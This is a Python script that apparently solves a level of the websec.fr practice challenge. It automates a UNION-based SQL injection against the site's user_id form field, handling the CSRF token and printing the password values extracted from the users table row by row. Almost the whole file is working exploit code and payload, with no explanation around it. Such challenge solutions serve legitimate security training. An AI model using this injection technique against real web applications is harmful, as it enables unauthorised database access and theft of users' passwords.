import requests

TARGET_URL = 'https://websec.fr/level01'

def getTableName(s,csrf,i):
    data = {
        "user_id":f"1 union select null,password FROM users limit 1 offset {i};--",
        "submit":"Submit",
        "token":csrf
    }
    res = s.post(f"{TARGET_URL}/index.php",data=data)
    try:
        i = res.text.index("<p class=\"well\">")
        j = res.text[i:].index("</div>")
        response = res.text[i:i+j]
        i = response.index("<br />username -> ")
        i = i + len("<br />username -> ")
        j = response[i:].index("<br />")
        response = response[i:i+j]
        return response
    except:
        return None

def getTables():
    i = 0
    while(True):
        s, csrf = getSession()
        res = getTableName(s,csrf,i)
        i+=1
        if(res == None):
            break
        else:
            print(res)

def getSession():
    s = requests.Session()
    res = s.get(f"{TARGET_URL}/index.php")
    i = res.text.index("name=\"token\" value=\"")
    i += len("name=\"token\" value=\"")
    j = res.text[i:].index("\">")
    csrf = res.text[i:i+j]
    return (s,csrf)

getTables()